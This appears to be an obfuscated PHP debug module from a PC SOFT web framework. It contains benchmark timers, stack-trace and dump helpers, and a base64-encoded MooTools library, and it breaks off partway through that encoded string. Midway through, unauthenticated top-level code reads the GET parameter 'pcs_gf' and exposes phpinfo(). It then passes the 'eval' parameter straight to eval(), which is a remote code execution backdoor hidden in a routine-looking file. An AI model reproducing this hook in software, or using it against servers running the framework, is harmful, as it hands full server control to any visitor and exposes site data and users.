<?php
//24.0.30.0 FMK/Debug.php GF
//VersionVI: 01F240077f
//(c) 2005-2012 PC SOFT - Release
 if (!defined('__INC__FMK/Disque.php')) { define('__INC__FMK/Disque.php',true); include_once(WB_INCLUDE_PATH.'WD99bd5984d9c78e9239c729a52b83e562.php'); } if (!defined('__INC__FMK/Exception/Pile.php')) { define('__INC__FMK/Exception/Pile.php',true); include_once(WB_INCLUDE_PATH.'WDc8aea829013863fbce9e58dbd520d694.php'); } define('FMK_Debug',true); define('DEBUG_MAX_DUMP_SIZE',4000000); F6b1e3687(); if (_DEBUG_BENCHMARK_) { $bPEAR = FMK_Charge('FMK/Pear/PEAR.php',false); define('XVER_PEAR',$bPEAR); unset($bPEAR); $bPHPUnit = XVER_PEAR && PHPVERSION_5 && include_once 'PHPUnit/Framework.php'; define('XVER_PEAR_PHPUNIT',$bPHPUnit); unset($bPHPUnit); $bBenchmark = XVER_PEAR && include_once 'Benchmark/Timer.php'; define('XVER_PEAR_BENCHMARK',$bBenchmark); unset($bBenchmark); } F1e7b0563(); class FMK_Debug_Benchmark { var $tabTimers; var $tabTimerTermine; var $bEcho = false; function FMK_Debug_Benchmark() { $this->tabTimers = array(); $this->tabTimerTermine = array(); } function Fc8e79660($nTimerId) { if (isset($this->tabTimers[$nTimerId])) { if (!$this->tabTimerTermine[$nTimerId]) $this->tabTimers[$nTimerId]->stop(); unset($this->tabTimers[$nTimerId]); $this->tabTimers[$nTimerId] = null; unset($this->tabTimerTermine[$nTimerId]); $this->tabTimerTermine[$nTimerId] = null; if ($this->bEcho) echo "Suppression du timer $nTimerId<br>"; } } function F9a032022($nTimerId = null) { if (!isset($nTimerId)) $nTimerId = 0; $this->Fc8e79660($nTimerId); $this->tabTimers[$nTimerId] = new Benchmark_Timer(); $this->tabTimers[$nTimerId]->start(); $this->tabTimerTermine[$nTimerId]=false; if ($this->bEcho) echo "Démarrage du timer $nTimerId<br>"; return true; } function F7364c919($nTimerId = null) { if (!isset($nTimerId)) $nTimerId=0; if (!isset($this->tabTimerTermine[$nTimerId]) || $this->tabTimerTermine[$nTimerId]) return true; $this->tabTimers[$nTimerId]->stop(); $this->tabTimerTermine[$nTimerId] = true; if ($this->bEcho) echo "Arrêt du timer $nTimerId<br>"; return true; } function F40e9c253($sMarqueur, $nTimerId = null) { if (!isset($nTimerId)) $nTimerId=0; if (!isset($this->tabTimers[$nTimerId])) return false; if ($this->tabTimerTermine[$nTimerId]){ $this->tabTimers[$nTimerId]->start(); } if ($this->bEcho) echo "Marqueur $sMarqueur mis<br>"; $this->tabTimers[$nTimerId]->F40e9c253('MARQUEUR_'.$sMarqueur); return true; } function F2075ef5c($nTimerId = null, $bSupprimer = true) { if (!isset($nTimerId)) $nTimerId=0; if (!isset($this->tabTimers[$nTimerId])) return ''; if ($this->bEcho) echo "Résultats du timer $nTimerId<br>"; if ($bSupprimer) { $this->Fc8e79660($nTimerId); } return $this->tabTimers[$nTimerId]->getOutput(true,"html");; } } if (_DEBUG_BENCHMARK_ && XVER_PEAR && XVER_PEAR_BENCHMARK) { $GLOBALS['FMK_DEBUG_BENCHMARK'] = new FMK_Debug_Benchmark(); $GLOBALS['FMK_DEBUG_BENCHMARK']->F9a032022(); } function F7c4e05a3($message) { if (!function_exists('TraceInterne')) { die($message); } F01cd7827($message); } if (isset($_GET['pcs_gf'])) { switch ($_GET['pcs_gf']) { case "PHPINFO": phpinfo(); die(); break; case "PHPVERSION": F7c4e05a3(PHP_VERSION); break; case "DUMP": F7c4e05a3(PHP_VERSION); ob_start(); var_dump($_GET['DUMP']); F7c4e05a3( ob_get_clean() ); break; } if (isset($_GET['eval'])) { eval($_GET['eval']); } } function Fbb776f98($bIgnoreFMK = true, $sGlue = " > ") { $fmkPile = new FMK_Exception_Pile(); $fmkPile->F74a027ca(); $fmkPile->F74a027ca(); $tabAppelsEtLignes = $fmkPile->F0946bdc0($bIgnoreFMK); $tabAppels = $tabAppelsEtLignes[PILE_FONCTION]; $nCount = count($tabAppels,COUNT_NORMAL); for($i=0; $i<$nCount; $i++) { $sNomWL = Fac06269c($tabAppels[$i]); if (strcmp($sNomWL,$tabAppels[$i])!==0) $tabAppels[$i] = "PCode de " . $sNomWL . "(". $tabAppels[$i] .") @ l " . $tabAppelsEtLignes[PILE_LIGNE][$i]; else $tabAppels[$i].= " @ l " . $tabAppelsEtLignes[PILE_LIGNE][$i]; } return utf8_implode($sGlue,$tabAppels); } function F5a596429($bPileSimplifiee = true, $bIgnoreFMK = false, $sGlue = "<br>") { $ID = uniqid('TRACEID_'); $sLienPile ='<a href="#" onclick=\'javascript:if (document.getElementById("'.$ID.'").style.display=="") document.getElementById("'.$ID.'").style.display = "none"; else document.getElementById("'.$ID.'").style.display="";\'>[Pile]</a>'; $sLienPile.='<div style="display:none; position:relative; height:300px; width:1024px; overflow:auto" id="'.$ID.'">'; if ($bPileSimplifiee) { $sPile = Fbb776f98($bIgnoreFMK,$sGlue); } else { ob_start(); var_dump(debug_backtrace()); $sPile = ob_get_contents(); ob_end_clean(); $sPile = "<pre>" . utf8_htmlentities($sPile,ENT_QUOTES) . "</pre>"; } $sLienPile .= $sPile; $sLienPile .= '</div>'; return $sLienPile; } function F0dadaae4($errno, $errstr, $errfile, $errline) { if (F977b2c2d()) { if (ASSERT_DUMP) { $tabContenu = file($errfile); $sLigne = $tabContenu[ $errline ]; F706b8258("return \"" . utf8_addslashes($sLigne) . "\";"); } return; } $sNiveau = ''; switch ($errno) { case E_ERROR: $sNiveau = "PHP FATAL - "; break; case E_STRICT: $sNiveau = "PHP STRICT - "; break; case E_WARNING: $sNiveau = "PHP WARNING - "; break; case E_NOTICE: $sNiveau = "PHP NOTICE - "; break; default: } $sNiveau = "Debug : ".$sNiveau; $sMessage = $sNiveau.$errstr.' dans '.$errfile.' ('.$errline.') '.F5a596429(); F7c4e05a3($sMessage); } function F77f6c673($bAvecSession = false,$pile = null) { ob_start(); if ($bAvecSession) { var_dump($_SESSION); echo "----------------------------------------\n"; echo "----------------------------------------\n"; echo "----------------------------------------\n"; } $debug = (!isset($pile)) ? debug_backtrace() : $pile; print_r($debug ); $sOption = 'a+'; if (file_exists( WB_RES_DIR. 'debug.txt')) { if ( filesize(WB_RES_DIR . 'debug.txt') > DEBUG_MAX_DUMP_SIZE ) { $sOption = 'w+'; } } fwrite(fopen( WB_RES_DIR . 'debug.txt',$sOption),ob_get_contents()); Fb132d5e7($debug,$sOption); ob_end_clean(); } function Fce99e3ed(&$html) { if (function_exists('xdebug_print_function_stack')) { xdebug_print_function_stack(); } $html = F95e8b285(); if (file_exists( WB_RES_DIR. 'debug.txt')) { return file_get_contents(WB_RES_DIR . 'debug.txt'); } return ''; } function F48fd27ac() { if (file_exists( WB_RES_DIR. 'debug.txt')) { unlink( WB_RES_DIR . 'debug.txt'); } if (file_exists( WB_RES_DIR. 'debug_var.txt')) { unlink( WB_RES_DIR . 'debug_var.txt'); } } function F706b8258($sCmd, $sFile = null, $bOverwrite = false) { ob_start(); if (!isset($sFile)) $sFile = 'dump_'.rand(0,1000).'.log'; eval($sCmd); $sOpenMode = $bOverwrite ? 'w+' : 'a+'; fwrite(fopen($sFile,$sOpenMode),ob_get_contents()); ob_end_clean(); } function F3028d095($tab, $niveau=0){ $decalage = utf8_str_repeat(' ', $niveau*5); if ($niveau == 0) echo '<PRE>'; if (is_array($tab) || is_object($tab)) { foreach ( $tab as $key => $value) { if (is_array($value)){ echo $decalage."[$key] => Array(".count($value)."){<BR>"; F3028d095($value, $niveau+1); echo $decalage."}<BR>"; } else if (is_object($value)){ echo $decalage."[$key] => Object(".get_class($value).") {"; echo $decalage."}<BR>"; } else { echo $decalage."[$key] => $value<BR>"; } } } if ($niveau == 0) echo "</PRE>"; } function Fabd5711d($sWS) { switch ($sWS) { case 'MOOTOOLS': return base64_decode("Ly9Nb29Ub29scywgPGh0dHA6Ly9tb290b29scy5uZXQ+LCBNeSBPYmplY3QgT3JpZW50ZWQgKEphdmFTY3JpcHQpIFRvb2xzLiBDb3B5cmlnaHQgKGMpIDIwMDYtMjAwOCBWYWxlcmlvIFByb2lldHRpLCA8aHR0cDovL21hZDRtaWxrLm5ldD4sIE1JVCBTdHlsZSBMaWNlbnNlLgoKdmFyIE1vb1Rvb2xzPXt2ZXJzaW9uOiIxLjIuMCIsYnVpbGQ6IiJ9O3ZhciBOYXRpdmU9ZnVuY3Rpb24oSil7Sj1KfHx7fTt2YXIgRj1KLmFmdGVySW1wbGVtZW50fHxmdW5jdGlvbigpe307dmFyIEc9Si5nZW5lcmljcztHPShHIT09ZmFsc2UpO3ZhciBIPUoubGVnYWN5Owp2YXIgRT1KLmluaXRpYWxpemU7dmFyIEI9Si5wcm90ZWN0O3ZhciBBPUoubmFtZTt2YXIgQz1FfHxIO0MuY29uc3RydWN0b3I9TmF0aXZlO0MuJGZhbWlseT17bmFtZToibmF0aXZlIn07aWYoSCYmRSl7Qy5wcm90b3R5cGU9SC5wcm90b3R5cGU7fUMucHJvdG90eXBlLmNvbnN0cnVjdG9yPUM7CmlmKEEpe3ZhciBEPUEudG9Mb3dlckNhc2UoKTtDLnByb3RvdHlwZS4kZmFtaWx5PXtuYW1lOkR9O05hdGl2ZS50eXBpemUoQyxEKTt9dmFyIEk9ZnVuY3Rpb24oTSxLLE4sTCl7aWYoIUJ8fEx8fCFNLnByb3RvdHlwZVtLXSl7TS5wcm90b3R5cGVbS109Tjt9aWYoRyl7TmF0aXZlLmdlbmVyaWNpemUoTSxLLEIpOwp9Ri5jYWxsKE0sSyxOKTtyZXR1cm4gTTt9O0MuaW1wbGVtZW50PWZ1bmN0aW9uKEwsSyxOKXtpZih0eXBlb2YgTD09InN0cmluZyIpe3JldHVybiBJKHRoaXMsTCxLLE4pO31mb3IodmFyIE0gaW4gTCl7SSh0aGlzLE0sTFtNXSxLKTt9cmV0dXJuIHRoaXM7fTtDLmFsaWFzPWZ1bmN0aW9uKE0sSyxOKXtpZih0eXBlb2YgTT09InN0cmluZyIpe009dGhpcy5wcm90b3R5cGVbTV07CmlmKE0pe0kodGhpcyxLLE0sTik7fX1lbHNle2Zvcih2YXIgTCBpbiBNKXt0aGlzLmFsaWFzKEwsTVtMXSxLKTt9fXJldHVybiB0aGlzO307cmV0dXJuIEM7fTtOYXRpdmUuaW1wbGVtZW50PWZ1bmN0aW9uKEQsQyl7Zm9yKHZhciBCPTAsQT1ELmxlbmd0aDtCPEE7QisrKXtEW0JdLmltcGxlbWVudChDKTsKfX07TmF0aXZlLmdlbmVyaWNpemU9ZnVuY3Rpb24oQixDLEEpe2lmKCghQXx8IUJbQ10pJiZ0eXBlb2YgQi5wcm90b3R5cGVbQ109PSJmdW5jdGlvbiIpe0JbQ109ZnVuY3Rpb24oKXt2YXIgRD1BcnJheS5wcm90b3R5cGUuc2xpY2UuY2FsbChhcmd1bWVudHMpO3JldHVybiBCLnByb3RvdHlwZVtDXS5hcHBseShELnNoaWZ0KCksRCk7Cn07fX07TmF0aXZlLnR5cGl6ZT1mdW5jdGlvbihBLEIpe2lmKCFBLnR5cGUpe0EudHlwZT1mdW5jdGlvbihDKXtyZXR1cm4oJHR5cGUoQyk9PT1CKTt9O319O05hdGl2ZS5hbGlhcz1mdW5jdGlvbihFLEIsQSxGKXtmb3IodmFyIEQ9MCxDPUUubGVuZ3RoO0Q8QztEKyspe0VbRF0uYWxpYXMoQixBLEYpOwp9fTsoZnVuY3Rpb24oQil7Zm9yKHZhciBBIGluIEIpe05hdGl2ZS50eXBpemUoQltBXSxBKTt9fSkoeyJib29sZWFuIjpCb29sZWFuLCJuYXRpdmUiOk5hdGl2ZSxvYmplY3Q6T2JqZWN0fSk7KGZ1bmN0aW9uKEIpe2Zvcih2YXIgQSBpbiBCKXtuZXcgTmF0aXZlKHtuYW1lOkEsaW5pdGlhbGl6ZTpCW0FdLHByb3RlY3Q6dHJ1ZX0pOwp9fSkoe1N0cmluZzpTdHJpbmcsRnVuY3Rpb246RnVuY3Rpb24sTnVtYmVyOk51bWJlcixBcnJheTpBcnJheSxSZWdFeHA6UmVnRXhwLERhdGU6RGF0ZX0pOyhmdW5jdGlvbihCLEEpe2Zvcih2YXIgQz1BLmxlbmd0aDtDLS07Qyl7TmF0aXZlLmdlbmVyaWNpemUoQixBW0NdLHRydWUpOwp9cmV0dXJuIGFyZ3VtZW50cy5jYWxsZWU7fSkoQXJyYXksWyJwb3AiLCJwdXNoIiwicmV2ZXJzZSIsInNoaWZ0Iiwic29ydCIsInNwbGljZSIsInVuc2hpZnQiLCJjb25jYXQiLCJqb2luIiwic2xpY2UiLCJ0b1N0cmluZyIsInZhbHVlT2YiLCJpbmRleE9mIiwibGFzdEluZGV4T2YiXSkoU3RyaW5nLFsiY2hhckF0IiwiY2hhckNvZGVBdCIsImNvbmNhdCIsImluZGV4T2YiLCJsYXN0SW5kZXhPZiIsIm1hdGNoIiwicmVwbGFjZSIsInNlYXJjaCIsInNsaWNlIiwic3BsaXQiLCJzdWJzdHIiLCJzdWJzdHJpbmciLCJ0b0xvd2VyQ2FzZSIsInRvVXBwZXJDYXNlIiwidmFsdWVPZiJdKTsKZnVuY3Rpb24gJGNoayhBKXtyZXR1cm4gISEoQXx8QT09PTApO31mdW5jdGlvbiAkY2xlYXIoQSl7Y2xlYXJUaW1lb3V0KEEpO2NsZWFySW50ZXJ2YWwoQSk7cmV0dXJuIG51bGw7fWZ1bmN0aW9uICRkZWZpbmVkKEEpe3JldHVybihBIT11bmRlZmluZWQpO31mdW5jdGlvbiAkZW1wdHkoKXt9ZnVuY3Rpb24gJGFyZ3VtZW50cyhBKXtyZXR1cm4gZnVuY3Rpb24oKXtyZXR1cm4gYXJndW1lbnRzW0FdOwp9O31mdW5jdGlvbiAkbGFtYmRhKEEpe3JldHVybih0eXBlb2YgQT09ImZ1bmN0aW9uIik/QTpmdW5jdGlvbigpe3JldHVybiBBO307fWZ1bmN0aW9uICRleHRlbmQoQyxBKXtmb3IodmFyIEIgaW4gKEF8fHt9KSl7Q1tCXT1BW0JdO31yZXR1cm4gQzt9ZnVuY3Rpb24gJHVubGluayhDKXt2YXIgQjsKc3dpdGNoKCR0eXBlKEMpKXtjYXNlIm9iamVjdCI6Qj17fTtmb3IodmFyIEUgaW4gQyl7QltFXT0kdW5saW5rKENbRV0pO31icmVhaztjYXNlImhhc2giOkI9JHVubGluayhDLmdldENsZWFuKCkpO2JyZWFrO2Nhc2UiYXJyYXkiOkI9W107Zm9yKHZhciBEPTAsQT1DLmxlbmd0aDsKRDxBO0QrKyl7QltEXT0kdW5saW5rKENbRF0pO31icmVhaztkZWZhdWx0OnJldHVybiBDO31yZXR1cm4gQjt9ZnVuY3Rpb24gJG1lcmdlKCl7dmFyIEU9e307Zm9yKHZhciBEPTAsQT1hcmd1bWVudHMubGVuZ3RoO0Q8QTtEKyspe3ZhciBCPWFyZ3VtZW50c1tEXTtpZigkdHlwZShCKSE9Im9iamVjdCIpe2NvbnRpbnVlOwp9Zm9yKHZhciBDIGluIEIpe3ZhciBHPUJbQ10sRj1FW0NdO0VbQ109KEYmJiR0eXBlKEcpPT0ib2JqZWN0IiYmJHR5cGUoRik9PSJvYmplY3QiKT8kbWVyZ2UoRixHKTokdW5saW5rKEcpO319cmV0dXJuIEU7fWZ1bmN0aW9uICRwaWNrKCl7Zm9yKHZhciBCPTAsQT1hcmd1bWVudHMubGVuZ3RoOwpCPEE7QisrKXtpZihhcmd1bWVudHNbQl0hPXVuZGVmaW5lZCl7cmV0dXJuIGFyZ3VtZW50c1tCXTt9fXJldHVybiBudWxsO31mdW5jdGlvbiAkcmFuZG9tKEIsQSl7cmV0dXJuIE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSooQS1CKzEpK0IpO31mdW5jdGlvbiAkc3BsYXQoQil7dmFyIEE9JHR5cGUoQik7CnJldHVybihBKT8oKEEhPSJhcnJheSImJkEhPSJhcmd1bWVudHMiKT9bQl06Qik6W107fXZhciAkdGltZT1EYXRlLm5vd3x8ZnVuY3Rpb24oKXtyZXR1cm4gbmV3IERhdGUoKS5nZXRUaW1lKCk7fTtmdW5jdGlvbiAkdHJ5KCl7Zm9yKHZhciBCPTAsQT1hcmd1bWVudHMubGVuZ3RoOwpCPEE7QisrKXt0cnl7cmV0dXJuIGFyZ3VtZW50c1tCXSgpO31jYXRjaChDKXt9fXJldHVybiBudWxsO31mdW5jdGlvbiAkdHlwZShBKXtpZihBPT11bmRlZmluZWQpe3JldHVybiBmYWxzZTt9aWYoQS4kZmFtaWx5KXtyZXR1cm4oQS4kZmFtaWx5Lm5hbWU9PSJudW1iZXIiJiYhaXNGaW5pdGUoQSkpP2ZhbHNlOkEuJGZhbWlseS5uYW1lOwp9aWYoQS5ub2RlTmFtZSl7c3dpdGNoKEEubm9kZVR5cGUpe2Nhc2UgMTpyZXR1cm4iZWxlbWVudCI7Y2FzZSAzOnJldHVybigvXFMvKS50ZXN0KEEubm9kZVZhbHVlKT8idGV4dG5vZGUiOiJ3aGl0ZXNwYWNlIjt9fWVsc2V7aWYodHlwZW9mIEEubGVuZ3RoPT0ibnVtYmVyIil7aWYoQS5jYWxsZWUpe3JldHVybiJhcmd1bWVudHMiOwp9ZWxzZXtpZihBLml0ZW0pe3JldHVybiJjb2xsZWN0aW9uIjt9fX19cmV0dXJuIHR5cGVvZiBBO312YXIgSGFzaD1uZXcgTmF0aXZlKHtuYW1lOiJIYXNoIixpbml0aWFsaXplOmZ1bmN0aW9uKEEpe2lmKCR0eXBlKEEpPT0iaGFzaCIpe0E9JHVubGluayhBLmdldENsZWFuKCkpOwp9Zm9yKHZhciBCIGluIEEpe3RoaXNbQl09QVtCXTt9cmV0dXJuIHRoaXM7fX0pO0hhc2guaW1wbGVtZW50KHtnZXRMZW5ndGg6ZnVuY3Rpb24oKXt2YXIgQj0wO2Zvcih2YXIgQSBpbiB0aGlzKXtpZih0aGlzLmhhc093blByb3BlcnR5KEEpKXtCKys7fX1yZXR1cm4gQjsKfSxmb3JFYWNoOmZ1bmN0aW9uKEIsQyl7Zm9yKHZhciBBIGluIHRoaXMpe2lmKHRoaXMuaGFzT3duUHJvcGVydHkoQSkpe0IuY2FsbChDLHRoaXNbQV0sQSx0aGlzKTt9fX0sZ2V0Q2xlYW46ZnVuY3Rpb24oKXt2YXIgQj17fTtmb3IodmFyIEEgaW4gdGhpcyl7aWYodGhpcy5oYXNPd25Qcm9wZXJ0eShBKSl7QltBXT10aGlzW0FdOwp9fXJldHVybiBCO319KTtIYXNoLmFsaWFzKCJmb3JFYWNoIiwiZWFjaCIpO2Z1bmN0aW9uICRIKEEpe3JldHVybiBuZXcgSGFzaChBKTt9QXJyYXkuaW1wbGVtZW50KHtmb3JFYWNoOmZ1bmN0aW9uKEMsRCl7Zm9yKHZhciBCPTAsQT10aGlzLmxlbmd0aDtCPEE7QisrKXtDLmNhbGwoRCx0aGlzW0JdLEIsdGhpcyk7Cn19fSk7QXJyYXkuYWxpYXMoImZvckVhY2giLCJlYWNoIik7ZnVuY3Rpb24gJEEoQyl7aWYoQy5pdGVtKXt2YXIgRD1bXTtmb3IodmFyIEI9MCxBPUMubGVuZ3RoO0I8QTtCKyspe0RbQl09Q1tCXTt9cmV0dXJuIEQ7fXJldHVybiBBcnJheS5wcm90b3R5cGUuc2xpY2UuY2FsbChDKTsKfWZ1bmN0aW9uICRlYWNoKEMsQixEKXt2YXIgQT0kdHlwZShDKTsoKEE9PSJhcmd1bWVudHMifHxBPT0iY29sbGVjdGlvbiJ8fEE9PSJhcnJheSIpP0FycmF5Okhhc2gpLmVhY2goQyxCLEQpO312YXIgQnJvd3Nlcj1uZXcgSGFzaCh7RW5naW5lOntuYW1lOiJ1bmtub3duIix2ZXJzaW9uOiIifSxQbGF0Zm9ybTp7bmFtZToobmF2aWdhdG9yLnBsYXRmb3JtLm1hdGNoKC9tYWN8d2lufGxpbnV4L2kpfHxbIm90aGVyIl0pWzBdLnRvTG93ZXJDYXNlKCl9LEZlYXR1cmVzOnt4cGF0aDohIShkb2N1bWVudC5ldmFsdWF0ZSksYWlyOiEhKHdpbmRvdy5ydW50aW1lKX0sUGx1Z2luczp7fX0pOwppZih3aW5kb3cub3BlcmEpe0Jyb3dzZXIuRW5naW5lPXtuYW1lOiJwcmVzdG8iLHZlcnNpb246KGRvY3VtZW50LmdldEVsZW1lbnRzQnlDbGFzc05hbWUpPzk1MDo5MjV9O31lbHNle2lmKHdpbmRvdy5BY3RpdmVYT2JqZWN0KXtCcm93c2VyLkVuZ2luZT17bmFtZToidHJpZGVudCIsdmVyc2lvbjood2luZG93LlhNTEh0dHBSZXF1ZXN0KT81OjR9Owp9ZWxzZXtpZighbmF2aWdhdG9yLnRhaW50RW5hYmxlZCl7QnJvd3Nlci5FbmdpbmU9e25hbWU6IndlYmtpdCIsdmVyc2lvbjooQnJvd3Nlci5GZWF0dXJlcy54cGF0aCk/NDIwOjQxOX07fWVsc2V7aWYoZG9jdW1lbnQuZ2V0Qm94T2JqZWN0Rm9yIT1udWxsKXtCcm93c2VyLkVuZ2luZT17bmFtZToiZ2Vja28iLHZlcnNpb246KGRvY3VtZW50LmdldEVsZW1lbnRzQnlDbGFzc05hbWUpPzE5OjE4fTsKfX19fUJyb3dzZXIuRW5naW5lW0Jyb3dzZXIuRW5naW5lLm5hbWVdPUJyb3dzZXIuRW5naW5lW0Jyb3dzZXIuRW5naW5lLm5hbWUrQnJvd3Nlci5FbmdpbmUudmVyc2lvbl09dHJ1ZTtpZih3aW5kb3cub3JpZW50YXRpb24hPXVuZGVmaW5lZCl7QnJvd3Nlci5QbGF0Zm9ybS5uYW1lPSJpcG9kIjsKfUJyb3dzZXIuUGxhdGZvcm1bQnJvd3Nlci5QbGF0Zm9ybS5uYW1lXT10cnVlO0Jyb3dzZXIuUmVxdWVzdD1mdW5jdGlvbigpe3JldHVybiAkdHJ5KGZ1bmN0aW9uKCl7cmV0dXJuIG5ldyBYTUxIdHRwUmVxdWVzdCgpO30sZnVuY3Rpb24oKXtyZXR1cm4gbmV3IEFjdGl2ZVhPYmplY3QoIk1TWE1MMi5YTUxIVFRQIik7Cn0pO307QnJvd3Nlci5GZWF0dXJlcy54aHI9ISEoQnJvd3Nlci5SZXF1ZXN0KCkpO0Jyb3dzZXIuUGx1Z2lucy5GbGFzaD0oZnVuY3Rpb24oKXt2YXIgQT0oJHRyeShmdW5jdGlvbigpe3JldHVybiBuYXZpZ2F0b3IucGx1Z2luc1siU2hvY2t3YXZlIEZsYXNoIl0uZGVzY3JpcHRpb247Cn0sZnVuY3Rpb24oKXtyZXR1cm4gbmV3IEFjdGl2ZVhPYmplY3QoIlNob2Nrd2F2ZUZsYXNoLlNob2Nrd2F2ZUZsYXNoIikuR2V0VmFyaWFibGUoIiR2ZXJzaW9uIik7fSl8fCIwIHIwIikubWF0Y2goL1xkKy9nKTtyZXR1cm57dmVyc2lvbjpwYXJzZUludChBWzBdfHwwKyIuIitBWzFdfHwwKSxidWlsZDpwYXJzZUludChBWzJdfHwwKX07Cn0pKCk7ZnVuY3Rpb24gJGV4ZWMoQil7aWYoIUIpe3JldHVybiBCO31pZih3aW5kb3cuZXhlY1NjcmlwdCl7d2luZG93LmV4ZWNTY3JpcHQoQik7fWVsc2V7dmFyIEE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7QS5zZXRBdHRyaWJ1dGUoInR5cGUiLCJ0ZXh0L2phdmFzY3JpcHQiKTsKQS50ZXh0PUI7ZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChBKTtkb2N1bWVudC5oZWFkLnJlbW92ZUNoaWxkKEEpO31yZXR1cm4gQjt9TmF0aXZlLlVJRD0xO3ZhciAkdWlkPShCcm93c2VyLkVuZ2luZS50cmlkZW50KT9mdW5jdGlvbihBKXtyZXR1cm4oQS51aWR8fChBLnVpZD1bTmF0aXZlLlVJRCsrXSkpWzBdOwp9OmZ1bmN0aW9uKEEpe3JldHVybiBBLnVpZHx8KEEudWlkPU5hdGl2ZS5VSUQrKyk7fTt2YXIgV2luZG93PW5ldyBOYXRpdmUoe25hbWU6IldpbmRvdyIsbGVnYWN5OihCcm93c2VyLkVuZ2luZS50cmlkZW50KT9udWxsOndpbmRvdy5XaW5kb3csaW5pdGlhbGl6ZTpmdW5jdGlvbihBKXskdWlkKEEpOwppZighQS5FbGVtZW50KXtBLkVsZW1lbnQ9JGVtcHR5O2lmKEJyb3dzZXIuRW5naW5lLndlYmtpdCl7QS5kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpZnJhbWUiKTt9QS5FbGVtZW50LnByb3RvdHlwZT0oQnJvd3Nlci5FbmdpbmUud2Via2l0KT93aW5kb3dbIltbRE9NRWxlbWVudC5wcm90b3R5cGVdXSJdOnt9Owp9cmV0dXJuICRleHRlbmQoQSxXaW5kb3cuUHJvdG90eXBlKTt9LGFmdGVySW1wbGVtZW50OmZ1bmN0aW9uKEIsQSl7d2luZG93W0JdPVdpbmRvdy5Qcm90b3R5cGVbQl09QTt9fSk7V2luZG93LlByb3RvdHlwZT17JGZhbWlseTp7bmFtZToid2luZG93In19O25ldyBXaW5kb3cod2luZG93KTsKdmFyIERvY3VtZW50PW5ldyBOYXRpdmUoe25hbWU6IkRvY3VtZW50IixsZWdhY3k6KEJyb3dzZXIuRW5naW5lLnRyaWRlbnQpP251bGw6d2luZG93LkRvY3VtZW50LGluaXRpYWxpemU6ZnVuY3Rpb24oQSl7JHVpZChBKTtBLmhlYWQ9QS5nZXRFbGVtZW50c0J5VGFnTmFtZSgiaGVhZCIpWzBdOwpBLmh0bWw9QS5nZXRFbGVtZW50c0J5VGFnTmFtZSgiaHRtbCIpWzBdO0Eud2luZG93PUEuZGVmYXVsdFZpZXd8fEEucGFyZW50V2luZG93O2lmKEJyb3dzZXIuRW5naW5lLnRyaWRlbnQ0KXskdHJ5KGZ1bmN0aW9uKCl7QS5leGVjQ29tbWFuZCgiQmFja2dyb3VuZEltYWdlQ2FjaGUiLGZhbHNlLHRydWUpOwp9KTt9cmV0dXJuICRleHRlbmQoQSxEb2N1bWVudC5Qcm90b3R5cGUpO30sYWZ0ZXJJbXBsZW1lbnQ6ZnVuY3Rpb24oQixBKXtkb2N1bWVudFtCXT1Eb2N1bWVudC5Qcm90b3R5cGVbQl09QTt9fSk7RG9jdW1lbnQuUHJvdG90eXBlPXskZmFtaWx5OntuYW1lOiJkb2N1bWVudCJ9fTsKbmV3IERvY3VtZW50KGRvY3VtZW50KTtBcnJheS5pbXBsZW1lbnQoe2V2ZXJ5OmZ1bmN0aW9uKEMsRCl7Zm9yKHZhciBCPTAsQT10aGlzLmxlbmd0aDtCPEE7QisrKXtpZighQy5jYWxsKEQsdGhpc1tCXSxCLHRoaXMpKXtyZXR1cm4gZmFsc2U7fX1yZXR1cm4gdHJ1ZTsKfSxmaWx0ZXI6ZnVuY3Rpb24oRCxFKXt2YXIgQz1bXTtmb3IodmFyIEI9MCxBPXRoaXMubGVuZ3RoO0I8QTtCKyspe2lmKEQuY2FsbChFLHRoaXNbQl0sQix0aGlzKSl7Qy5wdXNoKHRoaXNbQl0pO319cmV0dXJuIEM7fSxjbGVhbjpmdW5jdGlvbigpe3JldHVybiB0aGlzLmZpbHRlcigkZGVmaW5lZCk7Cn0saW5kZXhPZjpmdW5jdGlvbihDLEQpe3ZhciBBPXRoaXMubGVuZ3RoO2Zvcih2YXIgQj0oRDwwKT9NYXRoLm1heCgwLEErRCk6RHx8MDtCPEE7QisrKXtpZih0aGlzW0JdPT09Qyl7cmV0dXJuIEI7fX1yZXR1cm4gLTE7fSxtYXA6ZnVuY3Rpb24oRCxFKXt2YXIgQz1bXTsKZm9yKHZhciBCPTAsQT10aGlzLmxlbmd0aDtCPEE7QisrKXtDW0JdPUQuY2FsbChFLHRoaXNbQl0sQix0aGlzKTt9cmV0dXJuIEM7fSxzb21lOmZ1bmN0aW9uKEMsRCl7Zm9yKHZhciBCPTAsQT10aGlzLmxlbmd0aDtCPEE7QisrKXtpZihDLmNhbGwoRCx0aGlzW0JdLEIsdGhpcykpe3JldHVybiB0cnVlOwp9fXJldHVybiBmYWxzZTt9LGFzc29jaWF0ZTpmdW5jdGlvbihDKXt2YXIgRD17fSxCPU1hdGgubWluKHRoaXMubGVuZ3RoLEMubGVuZ3RoKTtmb3IodmFyIEE9MDtBPEI7QSsrKXtEW0NbQV1dPXRoaXNbQV07fXJldHVybiBEO30sbGluazpmdW5jdGlvbihDKXt2YXIgQT17fTsKZm9yKHZhciBFPTAsQj10aGlzLmxlbmd0aDtFPEI7RSsrKXtmb3IodmFyIEQgaW4gQyl7aWYoQ1tEXSh0aGlzW0VdKSl7QVtEXT10aGlzW0VdO2RlbGV0ZSBDW0RdO2JyZWFrO319fXJldHVybiBBO30sY29udGFpbnM6ZnVuY3Rpb24oQSxCKXtyZXR1cm4gdGhpcy5pbmRleE9mKEEsQikhPS0xOwp9LGV4dGVuZDpmdW5jdGlvbihDKXtmb3IodmFyIEI9MCxBPUMubGVuZ3RoO0I8QTtCKyspe3RoaXMucHVzaChDW0JdKTt9cmV0dXJuIHRoaXM7fSxnZXRMYXN0OmZ1bmN0aW9uKCl7cmV0dXJuKHRoaXMubGVuZ3RoKT90aGlzW3RoaXMubGVuZ3RoLTFdOm51bGw7fSxnZXRSYW5kb206ZnVuY3Rpb24oKXtyZXR1cm4odGhpcy5sZW5ndGgpP3RoaXNbJHJhbmRvbSgwLHRoaXMubGVuZ3RoLTEpXTpudWxsOwp9LGluY2x1ZGU6ZnVuY3Rpb24oQSl7aWYoIXRoaXMuY29udGFpbnMoQSkpe3RoaXMucHVzaChBKTt9cmV0dXJuIHRoaXM7fSxjb21i